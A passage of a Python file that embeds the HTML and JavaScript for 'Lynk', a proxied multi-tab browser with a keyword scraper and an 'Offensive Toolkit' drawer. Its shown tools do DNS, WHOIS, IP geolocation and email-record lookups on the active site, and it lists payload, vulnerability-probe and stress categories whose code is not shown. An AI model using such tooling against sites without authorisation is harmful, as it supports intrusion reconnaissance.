}
</style></head><body>

<header>
  <div class="brand"><div class="brand-mark">L</div><span>Lynk</span></div>
  <div class="tabs" id="tablist"></div>
  <button class="newtab-inline" id="newtab" title="New tab (Ctrl+T)">+</button>
  <button class="btn" id="openScraper" title="Keyword scraper (Ctrl+F)">
    <span>🔎</span><span class="btn-label">Scrape</span></button>
  <button class="btn" id="openKit" title="Toolkit (Ctrl+B)">
    <span>🛠</span><span class="btn-label">Kit</span></button>
  <button class="btn icon" id="openSearch" title="Search (Ctrl+K)">⌘</button>
  <a href="/" class="btn icon" style="text-decoration:none" title="Home">⌂</a>
</header>

<div class="url-bar">
  <button class="nav-btn" id="back" title="Back" disabled>←</button>
  <button class="nav-btn" id="forward" title="Forward" disabled>→</button>
  <button class="nav-btn" id="reload" title="Reload">⟳</button>
  <input id="url" placeholder="Type a URL or search…" spellcheck="false" autocomplete="off">
  <button class="btn primary" id="go">Go</button>
</div>

<div class="stack" id="stack">
  <div class="overlay" id="emptyOverlay">
    <div class="overlay-icon">🌐</div>
    <div class="overlay-title">No tabs open</div>
    <div class="overlay-hint">
      Press <kbd>+</kbd> or <kbd>Ctrl</kbd>+<kbd>T</kbd> for a new tab.<br>
      <kbd>Ctrl</kbd>+<kbd>F</kbd> scraper · <kbd>Ctrl</kbd>+<kbd>B</kbd> toolkit · <kbd>Ctrl</kbd>+<kbd>K</kbd> search
    </div>
  </div>
</div>

<aside class="drawer left" id="scraperDrawer">
  <div class="drawer-header">
    <div class="drawer-title"><div class="mark">🔎</div><span>Keyword Scraper</span></div>
    <button class="drawer-close" id="scraperClose">✕</button>
  </div>
  <div class="drawer-body">
    <div class="scraper-search">
      <input id="scrapeInput" placeholder="keyword, regex, or /pattern/flags" autocomplete="off">
      <button class="btn primary" id="scrapeBtn">Scan all</button>
    </div>
    <div class="scraper-filters" id="scrapeFilters">
      <span class="scraper-filter active" data-mode="text">Text</span>
      <span class="scraper-filter" data-mode="regex">Regex</span>
      <span class="scraper-filter" data-mode="case">Case sensitive</span>
      <span class="scraper-filter" data-mode="whole">Whole word</span>
    </div>
    <div id="scrapeStats" style="display:none;margin-bottom:12px;font-size:12px;color:#94a3b8">
      <span><strong id="scrapeCount" style="color:#38bdf8">0</strong> matches</span>
      <span id="scrapeTabsInfo" style="margin-left:8px;color:#64748b"></span>
      <button class="btn small" id="scrapeClear" style="float:right;margin-left:6px">Clear</button>
      <button class="btn small" id="scrapeExport" style="float:right">Export</button>
    </div>
    <div id="scrapeResults"></div>
  </div>
</aside>

<aside class="drawer right" id="kitDrawer">
  <div class="drawer-header">
    <div class="drawer-title"><div class="mark">🛠</div><span>Offensive Toolkit</span></div>
    <button class="drawer-close" id="kitClose">✕</button>
  </div>
  <div class="drawer-body" id="kitBody"></div>
</aside>

<div class="ctx-menu" id="ctxMenu"></div>

<div class="search-modal" id="searchModal">
  <div class="box">
    <div class="label">Quick search</div>
    <form id="searchForm">
      <input id="searchQ" placeholder="search the web…" autocomplete="off" required>
      <select id="searchEngine">__OPTS__</select>
      <button type="submit" class="btn primary">Search</button>
    </form>
    <div style="display:flex;gap:8px;margin-top:12px;flex-wrap:wrap">
      <button type="button" class="btn" id="sNewTab">Open in new tab</button>
      <button type="button" class="btn" id="sSameTab">Open in current tab</button>
    </div>
  </div>
</div>

<div class="toast" id="toast"></div>

<script>
(function(){
"use strict";
var ENGINES = __ENGINES_JSON__;
var tabs = [];
var activeId = null;
var lastClosed = null;
var scrapeHitsByTab = {};

var stack = document.getElementById('stack');
var tablist = document.getElementById('tablist');
var urlInput = document.getElementById('url');
var btnBack = document.getElementById('back');
var btnForward = document.getElementById('forward');
var ctxMenu = document.getElementById('ctxMenu');
var toast = document.getElementById('toast');

function broadcastTabs(){
  try { window.dispatchEvent(new CustomEvent('lynk:tabs-changed')); } catch(e){}
}

function escHtml(s){
  return String(s).replace(/[&<>"']/g, function(c){
    return {'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c];
  });
}
function dl(name, text){
  var blob = new Blob([text], {type:'text/plain;charset=utf-8'});
  var a = document.createElement('a');
  a.href = URL.createObjectURL(blob); a.download = name;
  document.body.appendChild(a); a.click();
  setTimeout(function(){ URL.revokeObjectURL(a.href); a.remove(); }, 500);
}
var toastTimer = null;
function showToast(msg, undoLabel, undoFn){
  toast.innerHTML = '<span>' + escHtml(msg) + '</span>';
  if (undoLabel && undoFn){
    var u = document.createElement('span');
    u.className = 'undo'; u.textContent = undoLabel;
    u.addEventListener('click', function(e){
      e.stopPropagation(); hideToast(); undoFn();
    });
    toast.appendChild(u);
  }
  toast.classList.add('show');
  clearTimeout(toastTimer);
  toastTimer = setTimeout(hideToast, 4000);
}
function hideToast(){ toast.classList.remove('show'); }

function getIframeDoc(t){
  try {
    var f = t.frame; if (!f) return null;
    var d = f.contentDocument; if (!d || !d.body) return null;
    return d;
  } catch(e){ return null; }
}

function activeTab(){ return tabs.find(function(x){ return x.id === activeId; }) || null; }
function activeTabUrl(){ var t = activeTab(); return t ? t.url : ''; }
function activeTabHost(){
  var u = activeTabUrl();
  try { return new URL(u).hostname; } catch(e){ return ''; }
}
function activeTabOrigin(){
  var u = activeTabUrl();
  try { var x = new URL(u); return x.protocol + '//' + x.host; } catch(e){ return ''; }
}

function newId(){ return 't_'+Math.random().toString(36).slice(2,8); }
function addTab(url, opts){
  opts = opts || {};
  var id = newId();
  var title = url ? (opts.title || url.slice(0,60)) : 'New tab';
  var tab = { id:id, url:url||'', title:title, history:url?[url]:[], hpos:url?0:-1, frame:null };
  var frame = document.createElement('iframe');
  frame.className = 'frame';
  frame.dataset.tabId = id;
  frame.sandbox = 'allow-same-origin allow-scripts allow-forms allow-popups allow-modals allow-popups-to-escape-sandbox allow-downloads allow-top-navigation-by-user-activation';
  if (url) frame.src = '/proxy?url=' + encodeURIComponent(url);
  stack.appendChild(frame);
  tab.frame = frame;
  tabs.push(tab);
  if (url){
    frame.addEventListener('load', function(){
      try {
        var t2 = tabs.find(function(x){ return x.id === id; });
        if (!t2 || t2.url !== url) return;
        var dt = frame.contentDocument && frame.contentDocument.title;
        if (dt && dt.trim()){
          t2.title = dt.trim().slice(0,60);
          renderTabs();
          if (id === activeId) document.title = t2.title + ' · Lynk';
        }
      } catch(e){}
    });
  }
  hideEmpty();
  activateTab(id);
  renderTabs();
  broadcastTabs();
  return tab;
}
function activateTab(id){
  activeId = id;
  tabs.forEach(function(t){
    if (t.frame) t.frame.classList.toggle('active', t.id === id);
  });
  var t = activeTab();
  if (t){
    urlInput.value = t.url || '';
    document.title = (t.title || 'Lynk') + ' · Lynk';
    updateNav();
  } else {
    urlInput.value = '';
    btnBack.disabled = true; btnForward.disabled = true;
  }
  renderTabs();
  broadcastTabs();
}
function closeTab(id, opts){
  opts = opts || {};
  var i = tabs.findIndex(function(x){ return x.id === id; });
  if (i < 0) return;
  var t = tabs[i];
  if (!opts.silent) lastClosed = { url:t.url, title:t.title };
  if (t.frame) t.frame.remove();
  tabs.splice(i, 1);
  if (activeId === id){
    if (tabs.length) activateTab(tabs[Math.min(i, tabs.length-1)].id);
    else { activeId = null; showEmpty(); urlInput.value = '';
      document.title = 'Lynk · Multi-tab Browser'; }
  }
  renderTabs();
  broadcastTabs();
  if (!opts.silent && opts.showToast !== false){
    showToast('Tab closed', 'Undo', function(){
      if (lastClosed){ var r = lastClosed; lastClosed = null;
        addTab(r.url, { title:r.title }); }
    });
  }
}
function closeOthers(keepId){
  tabs.filter(function(t){ return t.id !== keepId; })
      .forEach(function(t){ closeTab(t.id, {silent:true,showToast:false}); });
  showToast('Other tabs closed');
}
function closeRight(fromId){
  var i = tabs.findIndex(function(x){ return x.id === fromId; });
  if (i < 0) return;
  tabs.slice(i+1).forEach(function(t){ closeTab(t.id, {silent:true,showToast:false}); });
}
function duplicateTab(id){
  var t = tabs.find(function(x){ return x.id === id; });
  if (t) addTab(t.url, { title:t.title });
}
function reopenLast(){
  if (!lastClosed) return;
  var r = lastClosed; lastClosed = null;
  addTab(r.url, { title:r.title });
}
function navigate(url, push){
  if (!activeId){ addTab(url); return; }
  var t = activeTab();
  if (!t) return;
  if (push){
    t.history = t.history.slice(0, t.hpos+1);
    t.history.push(url); t.hpos = t.history.length - 1;
  }
  t.url = url; t.title = url.slice(0,60);
  if (t.frame) t.frame.src = '/proxy?url=' + encodeURIComponent(url);
  urlInput.value = url;
  hideEmpty();
  renderTabs();
  updateNav();
  broadcastTabs();
}
function updateNav(){
  var t = activeTab();
  if (!t){ btnBack.disabled = true; btnForward.disabled = true; return; }
  btnBack.disabled = t.hpos <= 0;
  btnForward.disabled = t.hpos >= t.history.length - 1;
}
function showEmpty(){ document.getElementById('emptyOverlay').style.display = 'flex'; }
function hideEmpty(){ document.getElementById('emptyOverlay').style.display = 'none'; }
function reloadActive(){ var t = activeTab(); if (t && t.frame){ t.frame.src = t.frame.src; } }

function renderTabs(){
  tablist.innerHTML = '';
  tabs.forEach(function(t){
    var el = document.createElement('div');
    el.className = 'tab' + (t.id === activeId ? ' active' : '')
                 + (scrapeHitsByTab[t.id] ? ' has-scrape-hits' : '');
    el.setAttribute('role','tab'); el.dataset.tabId = t.id; el.title = t.url;
    var title = document.createElement('span');
    title.className = 'tab-title'; title.textContent = (t.title||'New tab').slice(0,30);
    el.appendChild(title);
    var closeEl = document.createElement('span');
    closeEl.className = 'close'; closeEl.textContent = '×';
    ['mousedown','mouseup','click','auxclick','contextmenu','pointerdown','pointerup']
      .forEach(function(ev){ closeEl.addEventListener(ev, function(e){ e.stopPropagation(); }); });
    closeEl.addEventListener('click', function(e){ e.preventDefault(); e.stopPropagation(); closeTab(t.id); });
    closeEl.addEventListener('auxclick', function(e){ if (e.button===1){ e.preventDefault(); closeTab(t.id); } });
    el.appendChild(closeEl);
    el.addEventListener('click', function(e){ if (e.target === closeEl) return; activateTab(t.id); });
    el.addEventListener('auxclick', function(e){ if (e.button===1){ e.preventDefault(); closeTab(t.id); } });
    el.addEventListener('contextmenu', function(e){ e.preventDefault(); openCtx(e.clientX, e.clientY, t.id); });
    tablist.appendChild(el);
  });
}

function openCtx(x, y, tabId){
  var t = tabs.find(function(z){ return z.id === tabId; });
  if (!t) return;
  var idx = tabs.findIndex(function(z){ return z.id === tabId; });
  var hasRight = idx < tabs.length - 1;
  var hasOthers = tabs.length > 1;
  ctxMenu.innerHTML = '';
  function mk(icon, label, h, sc, variant, disabled){
    var el = document.createElement('div');
    el.className = 'ctx-item' + (variant?' '+variant:'') + (disabled?' disabled':'');
    el.innerHTML = '<span style="width:14px;text-align:center;color:#64748b">'+icon+'</span>'
      + '<span class="k">'+label+'</span>'
      + (sc ? '<span class="shortcut">'+sc+'</span>' : '');
    if (!disabled) el.addEventListener('click', function(){ hideCtx(); h(); });
    return el;
  }
  function sep(){ var s = document.createElement('div'); s.className='ctx-sep'; return s; }
  ctxMenu.appendChild(mk('↻','Reload', function(){ reloadActive(); }, 'Ctrl+R'));
  ctxMenu.appendChild(mk('⎘','Duplicate', function(){ duplicateTab(tabId); }));
  ctxMenu.appendChild(sep());
  ctxMenu.appendChild(mk('✕','Close tab', function(){ closeTab(tabId); }, 'Ctrl+W', 'danger'));
  ctxMenu.appendChild(mk('⊘','Close others', function(){ closeOthers(tabId); }, null, 'danger', !hasOthers));
  ctxMenu.appendChild(mk('⇥','Close right', function(){ closeRight(tabId); }, null, 'danger', !hasRight));
  ctxMenu.appendChild(sep());
  ctxMenu.appendChild(mk('＋','New tab', function(){ addTab('https://duckduckgo.com'); }, 'Ctrl+T'));
  ctxMenu.appendChild(mk('↺','Reopen last', function(){ reopenLast(); }, 'Ctrl+Shift+T', null, !lastClosed));
  ctxMenu.classList.add('show');
  var r = ctxMenu.getBoundingClientRect();
  if (x + r.width > window.innerWidth - 8) x = window.innerWidth - r.width - 8;
  if (y + r.height > window.innerHeight - 8) y = window.innerHeight - r.height - 8;
  ctxMenu.style.left = x + 'px'; ctxMenu.style.top = y + 'px';
}
function hideCtx(){ ctxMenu.classList.remove('show'); }
document.addEventListener('click', function(e){ if (!ctxMenu.contains(e.target)) hideCtx(); });
document.addEventListener('contextmenu', function(e){
  if (!e.target.closest || !e.target.closest('.tab')) hideCtx();
});

function go(){
  var v = urlInput.value.trim(); if (!v) return;
  var isUrl = /^https?:\/\//i.test(v) || (/^[\w\-]+(\.[\w\-]+)+/.test(v) && !/\s/.test(v));
  navigate(isUrl ? (/^https?:\/\//i.test(v) ? v : 'https://'+v)
                : '/search?q='+encodeURIComponent(v)+'&engine=duckduckgo', true);
}
document.getElementById('go').onclick = go;
urlInput.addEventListener('keydown', function(e){ if (e.key==='Enter'){ e.preventDefault(); go(); } });
btnBack.onclick = function(){
  var t = activeTab(); if (!t || t.hpos <= 0) return;
  t.hpos--; navigate(t.history[t.hpos], false);
};
btnForward.onclick = function(){
  var t = activeTab(); if (!t || t.hpos >= t.history.length-1) return;
  t.hpos++; navigate(t.history[t.hpos], false);
};
document.getElementById('reload').onclick = reloadActive;
document.getElementById('newtab').onclick = function(){ addTab('https://duckduckgo.com'); };

var sm = document.getElementById('searchModal');
var searchQ = document.getElementById('searchQ');
function openSearch(){ sm.classList.add('show'); setTimeout(function(){ searchQ.focus(); }, 50); }
function closeSearch(){ sm.classList.remove('show'); }
document.getElementById('openSearch').onclick = openSearch;
sm.onclick = function(e){ if (e.target === sm) closeSearch(); };
function doSearch(target){
  var q = searchQ.value.trim();
  var eng = document.getElementById('searchEngine').value || 'duckduckgo';
  if (!q) return;
  if (target === 'newtab'){
    var qs = { google:'www.google.com/search?q=', bing:'www.bing.com/search?q=',
      ddg:'duckduckgo.com/?q=', brave:'search.brave.com/search?q=',
      startpage:'www.startpage.com/sp/search?query=', mojeek:'www.mojeek.com/search?q=',
      yandex:'yandex.com/search/?text=', qwant:'www.qwant.com/?q=',
      ecosia:'www.ecosia.org/search?q=', you:'you.com/search?q=',
      searx:'searx.be/search?q=', wikipedia:'en.wikipedia.org/w/index.php?search=',
      github:'github.com/search?q=', stackoverflow:'stackoverflow.com/search?q=' };
    addTab('https://' + (qs[eng]||'duckduckgo.com/?q=') + encodeURIComponent(q));
  } else {
    navigate('/search?q='+encodeURIComponent(q)+'&engine='+encodeURIComponent(eng), true);
  }
  closeSearch();
}
document.getElementById('searchForm').onsubmit = function(e){ e.preventDefault(); doSearch('sametab'); };
document.getElementById('sNewTab').onclick = function(){ doSearch('newtab'); };
document.getElementById('sSameTab').onclick = function(){ doSearch('sametab'); };

var scrapeMode = 'text', scrapeCase = false, scrapeWhole = false;
var lastScrapeResults = [], lastScrapeKeyword = '';
document.getElementById('openScraper').onclick = function(){
  document.getElementById('scraperDrawer').classList.add('open');
  setTimeout(function(){ document.getElementById('scrapeInput').focus(); }, 250);
};
document.getElementById('scraperClose').onclick = function(){
  document.getElementById('scraperDrawer').classList.remove('open');
};
document.getElementById('scrapeFilters').addEventListener('click', function(e){
  var f = e.target.closest('.scraper-filter'); if (!f) return;
  var m = f.dataset.mode;
  if (m === 'text' || m === 'regex'){
    document.querySelectorAll('[data-mode="text"],[data-mode="regex"]').forEach(function(x){
      x.classList.toggle('active', x === f);
    });
    scrapeMode = m;
  } else if (m === 'case'){ f.classList.toggle('active'); scrapeCase = f.classList.contains('active'); }
  else if (m === 'whole'){ f.classList.toggle('active'); scrapeWhole = f.classList.contains('active'); }
});
function buildRe(kw){
  if (scrapeMode === 'regex'){ try { return new RegExp(kw, scrapeCase?'g':'gi'); } catch(e){ return null; } }
  var e = kw.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
  if (scrapeWhole) e = '\\b' + e + '\\b';
  try { return new RegExp(e, scrapeCase?'g':'gi'); } catch(e){ return null; }
}
function scrapeAll(kw){
  var resultsEl = document.getElementById('scrapeResults');
  var statsEl = document.getElementById('scrapeStats');
  scrapeHitsByTab = {}; renderTabs();
  if (!kw.trim()){ resultsEl.innerHTML = '<div class="result-msg info">Type a keyword.</div>';
    statsEl.style.display='none'; return; }
  var re = buildRe(kw);
  if (!re){ resultsEl.innerHTML = '<div class="result-msg err">Invalid regex</div>'; return; }
  lastScrapeKeyword = kw;
  var all = [];
  var scanned = 0;
  tabs.forEach(function(t){
    var d = getIframeDoc(t); if (!d) return;
    scanned++;
    try {
      var walker = d.createTreeWalker(d.body || d.documentElement, NodeFilter.SHOW_TEXT, {
        acceptNode: function(n){
          if (!n.nodeValue || !n.nodeValue.trim()) return NodeFilter.FILTER_REJECT;
          var p = n.parentNode; if (!p) return NodeFilter.FILTER_REJECT;
          var tag = p.tagName;
          if (tag === 'SCRIPT' || tag === 'STYLE' || tag === 'NOSCRIPT') return NodeFilter.FILTER_REJECT;
          return NodeFilter.FILTER_ACCEPT;
        }
      });
      var node, processed = 0;
      while ((node = walker.nextNode()) && processed < 500){
        var text = node.nodeValue;
        re.lastIndex = 0;
        if (re.test(text)){
          re.lastIndex = 0;
          var m;
          while ((m = re.exec(text)) !== null && all.length < 500){
            all.push({ tabId: t.id, tabTitle: t.title, tabUrl: t.url,
              node: node, start: m.index, end: m.index + m[0].length,
              text: m[0], before: text.slice(Math.max(0,m.index-60), m.index),
              after: text.slice(m.index+m[0].length, m.index+m[0].length+60) });
            if (m.index === re.lastIndex) re.lastIndex++;
          }
          processed++;
        }
      }
      if (all.filter(function(x){ return x.tabId === t.id; }).length)
        scrapeHitsByTab[t.id] = true;
    } catch(e){}
  });
  lastScrapeResults = all;
  document.getElementById('scrapeCount').textContent = all.length;
  document.getElementById('scrapeTabsInfo').textContent = scanned + ' tab' + (scanned!==1?'s':'') + ' scanned';
  statsEl.style.display = 'block';
  if (!all.length){ resultsEl.innerHTML = '<div class="result-msg info">No matches.</div>'; return; }
  resultsEl.innerHTML = all.map(function(m, i){
    return '<div class="scraper-match" data-idx="'+i+'">'
      + '<div class="meta"><span class="tab-badge" title="'+escHtml(m.tabUrl)+'">'
      + escHtml(m.tabTitle.slice(0,26)) + '</span><span>offset '+m.start+'</span></div>'
      + '<div class="ctx" id="__s_'+i+'">'+escHtml(m.before)
      + '<mark>'+escHtml(m.text)+'</mark>'+escHtml(m.after)+'</div>'
      + '<div class="actions">'
      + '<button data-act="jump" data-i="'+i+'">→ Jump</button>'
      + '<button data-act="edit" data-i="'+i+'">✎ Edit</button>'
      + '<button data-act="copy" data-i="'+i+'">⧉ Copy</button>'
      + '</div></div>';
  }).join('');
  resultsEl.querySelectorAll('button[data-act]').forEach(function(b){
    b.onclick = function(e){
      e.stopPropagation();
      var m = all[parseInt(b.dataset.i,10)];
      if (!m) return;
      var act = b.dataset.act;
      if (act === 'jump'){
        activateTab(m.tabId);
        setTimeout(function(){
          try {
            var el = m.node.parentNode;
            if (el && el.scrollIntoView) el.scrollIntoView({behavior:'smooth', block:'center'});
          } catch(err){}
        }, 200);
      } else if (act === 'edit'){ inlineEdit(m, b.dataset.i); }
      else if (act === 'copy'){ navigator.clipboard.writeText(m.before+m.text+m.after); showToast('Context copied'); }
    };
  });
  renderTabs();
}
function inlineEdit(m, idx){
  var ctx = document.getElementById('__s_'+idx); if (!ctx) return;
  var mark = ctx.querySelector('mark'); if (!mark) return;
  mark.contentEditable = 'true';
  mark.style.outline = '2px solid #f59e0b';
  mark.style.background = 'rgba(245,158,11,.18)';
  mark.style.color = '#f59e0b';
  mark.style.padding = '1px 4px';
  mark.style.borderRadius = '3px';
  mark.focus();
  try {
    var r = document.createRange(); r.selectNodeContents(mark);
    var s = window.getSelection(); s.removeAllRanges(); s.addRange(r);
  } catch(e){}
  mark.addEventListener('keydown', function(ev){
    if (ev.key === 'Enter'){ ev.preventDefault(); mark.blur(); }
  });
  mark.addEventListener('blur', function once(){
    mark.removeEventListener('blur', once);
    mark.contentEditable = 'false';
    mark.style.outline = ''; mark.style.background = 'rgba(56,189,248,.25)';
    mark.style.color = '#38bdf8'; mark.style.padding = '1px 3px';
    var newText = mark.textContent;
    try {
      var node = m.node; var t = node.nodeValue;
      node.nodeValue = t.slice(0, m.start) + newText + t.slice(m.end);
      showToast('Text updated');
    } catch(e){ showToast('Edit failed'); }
  });
}
document.getElementById('scrapeBtn').onclick = function(){
  scrapeAll(document.getElementById('scrapeInput').value);
};
document.getElementById('scrapeInput').addEventListener('keydown', function(e){
  if (e.key === 'Enter'){ e.preventDefault(); scrapeAll(this.value); }
});
document.getElementById('scrapeClear').onclick = function(){
  lastScrapeResults = []; scrapeHitsByTab = {};
  document.getElementById('scrapeResults').innerHTML = '';
  document.getElementById('scrapeStats').style.display = 'none';
  renderTabs();
};
document.getElementById('scrapeExport').onclick = function(){
  var txt = lastScrapeResults.map(function(m){
    return '['+m.tabTitle+'] '+m.before+m.text+m.after;
  }).join('\n');
  dl('scrape_'+lastScrapeKeyword.replace(/[^\w\-]/g,'_')+'.txt', txt);
};

document.addEventListener('keydown', function(e){
  var mod = e.ctrlKey || e.metaKey;
  if (!mod){ if (e.key === 'Escape') closeSearch(); return; }
  var k = e.key.toLowerCase();
  if (k === 'k'){ e.preventDefault(); openSearch(); }
  else if (k === 'l'){ e.preventDefault(); urlInput.focus(); urlInput.select(); }
  else if (k === 'f'){ e.preventDefault(); document.getElementById('openScraper').click(); }
  else if (k === 'b'){ e.preventDefault(); document.getElementById('openKit').click(); }
  else if (k === 't' && !e.shiftKey){ e.preventDefault(); addTab('https://duckduckgo.com'); }
  else if (k === 'w'){ e.preventDefault(); if (activeId) closeTab(activeId); }
  else if (k === 't' && e.shiftKey){ e.preventDefault(); reopenLast(); }
  else if (k === 'r'){ e.preventDefault(); reloadActive(); }
  else if (k === 'tab'){
    e.preventDefault(); if (!tabs.length) return;
    var i = tabs.findIndex(function(x){ return x.id === activeId; });
    var n = e.shiftKey ? (i-1+tabs.length)%tabs.length : (i+1)%tabs.length;
    activateTab(tabs[n].id);
  }
  else if (/^[1-9]$/.test(k)){
    e.preventDefault(); var idx = parseInt(k,10)-1;
    if (idx < tabs.length) activateTab(tabs[idx].id);
  }
});

document.getElementById('openKit').onclick = function(){
  document.getElementById('kitDrawer').classList.toggle('open');
};
document.getElementById('kitClose').onclick = function(){
  document.getElementById('kitDrawer').classList.remove('open');
};

window.__LYNK__ = {
  tabs: function(){ return tabs; },
  activeTab: activeTab,
  activeTabUrl: activeTabUrl,
  activeTabHost: activeTabHost,
  activeTabOrigin: activeTabOrigin,
  getIframeDoc: getIframeDoc,
  addTab: addTab,
  activateTab: activateTab,
  closeTab: closeTab,
  navigate: navigate,
  toast: showToast,
  download: dl,
  escHtml: escHtml,
  kitDrawer: document.getElementById('kitDrawer'),
  kitBody: document.getElementById('kitBody'),
};

addTab('https://duckduckgo.com');

var kScript = document.createElement('script');
kScript.src = '/tool/kit.js';
document.body.appendChild(kScript);
})();
</script>
</body></html>
"""


# ======================================================================
# KIT_JS — served at /tool/kit.js (tabs-shell toolkit)
# ======================================================================
KIT_JS = r"""
(function(){
"use strict";
if (window.__LYNK_KIT__) return;
window.__LYNK_KIT__ = true;

var L = window.__LYNK__;
if (!L){ console.error('Lynk shell not loaded'); return; }
var $ = L.kitBody;
var toast = L.toast;
var dl = L.download;
var esc = L.escHtml;

// ================================================================
// Findings store
// ================================================================
var findings = [];
var kitView = 'tools';

function addFinding(f){
  f.id = 'f_'+Math.random().toString(36).slice(2,9);
  f.ts = Date.now();
  findings.push(f);
  updateCount();
}
function updateCount(){
  var b = document.querySelector('#kit-tab-findings .count');
  if (b) b.textContent = '('+findings.length+')';
  var t = document.querySelector('#kit-tab-tabs .count');
  if (t && L && L.tabs) t.textContent = '('+L.tabs().length+')';
}
function clearFindings(){ findings = []; updateCount(); }

// ================================================================
// Utilities
// ================================================================
async function fetchText(url, opts){
  var r = await fetch(url, Object.assign({credentials:'same-origin'}, opts||{}));
  return { status: r.status, headers: r.headers, body: await r.text() };
}
async function fetchJson(url, opts){
  var r = await fetch(url, Object.assign({credentials:'same-origin'}, opts||{}));
  var t = await r.text();
  try { return { status: r.status, headers: r.headers, data: JSON.parse(t) }; }
  catch(e){ return { status: r.status, headers: r.headers, data: null, raw: t }; }
}
function proxiedUrl(u){ return '/proxy?url=' + encodeURIComponent(u); }

async function dohQuery(name, type){
  var url = 'https://cloudflare-dns.com/dns-query?name='
    + encodeURIComponent(name) + '&type=' + type;
  var r = await fetchText(proxiedUrl(url), {
    headers: { 'Accept': 'application/dns-json' }
  });
  if (r.status !== 200) return null;
  try { return JSON.parse(r.body); } catch(e){ return null; }
}

async function backendPost(path, params){
  var fd = new FormData();
  Object.keys(params || {}).forEach(function(k){
    var v = params[k];
    fd.append(k, (v !== null && typeof v === 'object') ? JSON.stringify(v) : String(v));
  });
  var r = await fetch(path, { method:'POST', body: fd, credentials:'same-origin' });
  var t = await r.text();
  try { return { status: r.status, data: JSON.parse(t) }; }
  catch(e){ return { status: r.status, data: null, raw: t }; }
}
async function backendGet(path){
  var r = await fetch(path, { credentials:'same-origin' });
  var t = await r.text();
  try { return { status: r.status, data: JSON.parse(t) }; }
  catch(e){ return { status: r.status, data: null, raw: t }; }
}

// ================================================================
// TOOL DEFINITIONS
// ================================================================
var CATEGORIES = [
  { id: 'network',  name: '🌐 Network' },
  { id: 'osint',    name: '🕵️ OSINT' },
  { id: 'web',      name: '🌍 Web Security' },
  { id: 'cms',      name: '📦 CMS' },
  { id: 'webvuln',  name: '💥 Vulnerability Probes' },
  { id: 'encode',   name: '🔤 Encode / Hash' },
  { id: 'payloads', name: '📜 Payloads' },
  { id: 'recon',    name: '🔬 Recon (backend)' },
  { id: 'stress',   name: '🧪 Load Resilience' },
];

var TOOLS = {};
function reg(cat, tool){ tool.category = cat; TOOLS[tool.id] = tool; }

// ---------------- NETWORK ----------------
reg('network', {
  id: 'dns_records', icon: '📋', name: 'DNS Records',
  description: 'A, AAAA, MX, TXT, NS, CNAME, SOA via Cloudflare DoH',
  fields: [
    { name:'domain', label:'Domain', placeholder:'example.com' },
    { name:'types',  label:'Record types', default:'A,AAAA,MX,TXT,NS,CNAME,SOA' },
  ],
  auto: function(){ return { domain: L.activeTabHost(), types:'A,AAAA,MX,TXT,NS,CNAME,SOA' }; },
  run: async function(inp){
    if (!inp.domain) throw new Error('domain required');
    var types = (inp.types || 'A').split(',').map(function(s){return s.trim().toUpperCase();}).filter(Boolean);
    var out = [];
    for (var i = 0; i < types.length; i++){
      var t = types[i];
      try {
        var data = await dohQuery(inp.domain, t);
        var answers = (data && data.Answer) || [];
        out.push({ type: t, count: answers.length, records: answers.map(function(a){return a.data;}) });
      } catch(e){ out.push({ type:t, error: String(e) }); }
    }
    var html = '<div class="result-kv"><span class="k">Domain</span><span class="v">'+esc(inp.domain)+'</span></div>';
    out.forEach(function(r){
      html += '<div class="result-kv"><span class="k">'+r.type+'</span>'
        + '<span class="v">' + (r.error
            ? '<span style="color:#f87171">'+esc(r.error)+'</span>'
            : (r.records.length ? r.records.map(esc).join('<br>') : '<span style="color:#64748b">(none)</span>'))
        + '</span></div>';
    });
    return { html: html };
  },
});

reg('network', {
  id: 'whois', icon: '📇', name: 'WHOIS / RDAP',
  description: 'Registrar, creation date, nameservers via RDAP',
  fields: [{ name:'domain', label:'Domain', placeholder:'example.com' }],
  auto: function(){ return { domain: L.activeTabHost() }; },
  run: async function(inp){
    if (!inp.domain) throw new Error('domain required');
    var r = await fetchJson(proxiedUrl('https://rdap.org/domain/'+encodeURIComponent(inp.domain)));
    if (r.status !== 200 || !r.data) throw new Error('RDAP lookup failed ('+r.status+')');
    var d = r.data;
    var rows = [
      ['Domain', d.ldhName || inp.domain],
      ['Status', (d.status||[]).join(', ')],
      ['Nameservers', (d.nameservers||[]).map(function(n){return n.ldhName;}).join('<br>')],
    ];
    (d.events||[]).forEach(function(e){ rows.push([e.eventAction, e.eventDate]); });
    var registrar = '';
    (d.entities||[]).forEach(function(ent){
      if ((ent.roles||[]).indexOf('registrar') !== -1){
        (ent.vcardArray||[[]])[1] && (ent.vcardArray[1]||[]).forEach(function(v){
          if (v[0]==='fn') registrar = v[3];
        });
      }
    });
    if (registrar) rows.unshift(['Registrar', registrar]);
    var html = rows.map(function(r){
      return '<div class="result-kv"><span class="k">'+esc(r[0])+'</span>'
        + '<span class="v">'+(r[1] ? String(r[1]).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/<br>/g,'<br>') : '(none)')+'</span></div>';
    }).join('');
    return { html: html };
  },
});

reg('network', {
  id: 'ipinfo', icon: '📍', name: 'IP Geolocation',
  description: 'Country, city, ASN for a hostname or IP',
  fields: [{ name:'host', label:'Host or IP', placeholder:'example.com' }],
  auto: function(){ return { host: L.activeTabHost() }; },
  run: async function(inp){
    if (!inp.host) throw new Error('host required');
    var ipv4 = await dohQuery(inp.host, 'A');
    var ip = ipv4 && ipv4.Answer && ipv4.Answer[0] && ipv4.Answer[0].data;
    if (!ip) ip = inp.host;
    var r = await fetchJson(proxiedUrl('https://ipapi.co/'+encodeURIComponent(ip)+'/json/'));
    if (!r.data) throw new Error('Lookup failed');
    var d = r.data;
    var html = ['IP','City','Region','Country','Postal','Latitude','Longitude','Org','ASN','Timezone']
      .map(function(k){
        var v = d[k.toLowerCase()] || '';
        if (!v) return '';
        return '<div class="result-kv"><span class="k">'+k+'</span><span class="v">'+esc(String(v))+'</span></div>';
      }).join('');
    return { html: html || '<div class="result-msg warn">No data</div>' };
  },
});

reg('network', {
  id: 'spf_dmarc', icon: '📧', name: 'SPF / DMARC / DKIM',
  description: 'Email authentication records',
  fields: [{ name:'domain', label:'Domain', placeholder:'example.com' }],
  auto: function(){ return { domain: L.activeTabHost() }; },
  run: async function(inp){
    if (!inp.domain) throw new Error('domain required');
    var checks = [
      { label:'SPF',   name: inp.domain,                    type:'TXT' },
      { label:'DMARC', name:'_dmarc.'+inp.domain,           type:'TXT' },
